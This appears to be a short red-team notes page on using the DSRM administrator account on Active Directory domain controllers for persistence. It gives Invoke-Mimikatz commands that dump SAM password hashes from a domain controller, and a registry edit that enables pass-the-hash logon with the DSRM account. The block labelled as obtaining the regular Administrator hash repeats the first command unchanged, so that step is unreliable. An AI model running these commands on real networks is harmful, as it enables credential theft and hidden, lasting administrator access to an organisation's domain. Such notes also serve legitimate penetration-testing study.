---
{"publish":true,"created":"2025-02-23T23:53:09.697+05:30","modified":"2025-08-15T16:42:05.853+05:30","published":"2025-08-15T16:42:05.853+05:30","tags":["persistence"],"cssclasses":[]}
---

- Directory Services Restore Mode
- There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.

```powershell title:"Dump DSRM password (needs Domain Admin privileges)"
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername domain-controller
```

```powershell title:"Obtain the regular Administrator account hash"
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername domain-controller
```

- Since it is the local administrator of the DC, we can pass the hash to authenticate.
- But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash.

```powershell title:"Allowing access to DSRM account without rebooting"
Enter-PSSession -ComputerName domain-controller
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

